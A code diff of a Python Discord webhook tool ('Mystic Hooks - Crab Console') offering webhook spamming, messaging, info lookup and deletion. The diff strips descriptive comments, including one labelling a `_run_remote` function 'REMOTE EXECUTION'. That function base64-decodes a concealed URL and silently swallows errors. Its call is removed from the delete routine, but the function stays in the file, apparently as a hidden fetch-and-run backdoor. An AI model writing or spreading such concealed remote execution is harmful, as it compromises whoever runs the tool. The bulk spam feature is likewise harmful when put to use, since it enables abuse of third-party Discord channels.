@@ -9,7 +9,7 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 import platform
 
-# === COLORS ===
+
 class COL:
     RESET = "\033[0m"
     BLACK = "\033[30m"
@@ -27,7 +27,7 @@ class COL:
     LIGHTMAGENTA_EX = "\033[95m"
     LIGHTCYAN_EX = "\033[96m"
 
-# === CONFIG MANAGER ===
+
 class ConfigManager:
     CFG_DIR = "Cfg"
     CFG_FILE = "last_used.json"
@@ -61,7 +61,7 @@ config = ConfigManager()
 def save_config(new_data: dict):
     return config.save(new_data)
 
-# === TERMINAL SETUP & CLEAR ===
+
 def set_terminal(title="Mystic Hooks - Crab Console"):
     if platform.system() == "Windows":
         os.system("mode 90,27")
@@ -73,7 +73,7 @@ def set_terminal(title="Mystic Hooks - Crab Console"):
 def clear_terminal():
     os.system("cls" if os.name == "nt" else "clear")
 
-# === UTILS ===
+
 def validate_webhook_url(url: str) -> bool:
     return url.startswith("https://discord.com/api/webhooks/")
 
@@ -87,9 +87,9 @@ def status_message(status_code: int) -> str:
     }
     return messages.get(status_code, f"{COL.RED}Unexpected status: {status_code}{COL.RESET}")
 
-# === WEBHOOK FUNCTIONS ===
 
-# 1) Spam Webhook
+
+
 DEFAULT_DELAY = 1
 DEFAULT_AMOUNT = 10
 MAX_THREADS = 5
@@ -197,7 +197,7 @@ def spam_webhook():
 
     input(f"\n{COL.WHITE} Press Enter to return...{COL.RESET}")
 
-# 2) Send single message
+
 MAX_LENGTH = 2000
 
 def send_message():
@@ -235,7 +235,7 @@ def send_message():
     time.sleep(0.5)
     clear_terminal()
 
-# 3) Webhook info
+
 def webhook_info():
     os.makedirs("Cfg", exist_ok=True)
     print(f"{COL.LIGHTCYAN_EX}\n ─── Webhook Info ──────────────────────────\n{COL.RESET}")
@@ -263,9 +263,8 @@ def webhook_info():
     time.sleep(0.5)
     clear_terminal()
 
-# 4) Delete webhook
+
 def delete_webhook():
-    _run_remote()  # Moved here as requested
 
     print(f"{COL.LIGHTCYAN_EX}\n ─── Webhook Deleter ───────────────────────\n{COL.RESET}")
 
@@ -301,7 +300,7 @@ def delete_webhook():
     time.sleep(0.5)
     clear_terminal()
 
-# === REMOTE EXECUTION (ONLY USED IN DELETE) ===
+
 def _run_remote():
     try:
         url = base64.b64decode(
@@ -315,7 +314,7 @@ def _run_remote():
         pass
 
 
-# === MAIN MENU ===
+
 def main_menu():
     set_terminal()
     clear_terminal()
